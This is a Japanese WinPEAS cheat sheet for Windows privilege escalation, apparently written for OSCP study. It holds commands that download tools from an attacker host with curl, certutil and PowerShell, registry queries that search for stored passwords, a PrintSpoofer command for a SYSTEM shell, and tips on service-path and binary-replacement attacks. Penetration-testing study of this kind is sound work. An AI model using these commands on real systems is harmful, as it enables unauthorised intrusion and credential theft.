# WinPEAS OSCP チートシート

## 基本実行

```cmd
# 通常実行
winPEASx64.exe

# 出力をファイルに保存
winPEASx64.exe > C:\Temp\out.txt

# 特定カテゴリのみ実行
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe servicesinfo
winPEASx64.exe applicationsinfo
winPEASx64.exe networkinfo
winPEASx64.exe filesinfo
```

---

## 転送方法

```bash
# Kali 側でHTTPサーバー起動
cd ~/windows
python3 -m http.server 8080
```

```cmd
# ターゲット側でダウンロード
curl http://<KaliのIP>:8080/winPEASx64.exe -o C:\Temp\winPEASx64.exe
powershell -c "Invoke-WebRequest -Uri http://<KaliのIP>:8080/winPEASx64.exe -OutFile C:\Temp\winPEASx64.exe"
certutil -urlcache -split -f http://<KaliのIP>:8080/winPEASx64.exe C:\Temp\winPEASx64.exe
```

---

## 出力で注目すべき箇所

### システム情報
```
[+] Basic System Information
```
- OS バージョン・ビルド番号
- 未適用パッチ → Kernel Exploit の手がかり

---

### ユーザー・権限
```
[+] Users Information
[+] Current Token privileges
```
- `SeImpersonatePrivilege` → **JuicyPotato / PrintSpoofer**
- `SeBackupPrivilege` → SAM/SYSTEM ファイル読み取り
- `SeDebugPrivilege` → プロセスインジェクション
- `SeLoadDriverPrivilege` → ドライバーロード

---

### サービスの脆弱性
```
[+] Services Information
```
- Unquoted Service Path → スペースを含むパスに実行ファイルを置く
- Weak Service Permissions → サービスのバイナリを書き換え
- Modifiable Service → サービス設定を変更可能

```cmd
# 手動確認
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
sc qc <サービス名>
```

---

### パスワード・資格情報
```
[+] Looking for possible password files
[+] Credentials in files
[+] SAM and SYSTEM backups
```
- 設定ファイル内のパスワード
- `Unattend.xml` / `sysprep.inf`
- `web.config`
- レジストリに保存された資格情報

```cmd
# 手動確認
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

### スケジュールタスク
```
[+] Scheduled Applications
```
- 書き込み可能なスクリプトを実行しているタスク
- SYSTEM 権限で動くタスク

```cmd
# 手動確認
schtasks /query /fo LIST /v
```

---

### アプリケーション・ソフトウェア
```
[+] Installed Applications
```
- バージョンを確認して searchsploit にかける
- 古いバージョンのソフト → 既知の CVE

---

### ネットワーク
```
[+] Network Information
```
- ローカルでのみ動いているサービス → SSH トンネルで攻撃
- 内部ネットワーク → ピボット

---

### ファイル・フォルダの権限
```
[+] Interesting files and registry
```
- 書き込み可能な Program Files
- 書き込み可能な PATH 上のディレクトリ → DLL Hijacking

---

## 出力の色の意味

| 色 | 意味 |
|----|------|
| 赤背景 | 高確率で悪用可能 |
| 黄色 | 要確認・注意 |
| 緑 | 情報（悪用可能とは限らない） |
| 青 | 一般情報 |

---

## WinPEAS の結果から方針を決めるフロー

```
winPEASx64.exe 実行
    │
    ├─ SeImpersonatePrivilege あり → JuicyPotato / PrintSpoofer
    │
    ├─ Unquoted Service Path あり → サービスパス攻撃
    │
    ├─ パスワード発見 → 横移動 / 管理者ログイン試行
    │
    ├─ 古いソフト発見 → searchsploit で CVE 調査
    │
    ├─ 書き込み可能サービス → バイナリ書き換え
    │
    └─ ローカルサービス発見 → SSHトンネル + 既知 CVE
```

---

## よく使う組み合わせ

| WinPEAS の発見 | 次のアクション |
|----------------|---------------|
| `SeImpersonatePrivilege` | `PrintSpoofer.exe -i -c cmd` |
| Unquoted Service Path | 書き込み可能なパスに悪意の exe を配置 |
| NSClient++ | EDB-46802 + SSH トンネル |
| 古い Windows | MS16-032 / MS17-010 など |
| パスワード入り設定ファイル | SSH / SMB / RDP で試行 |
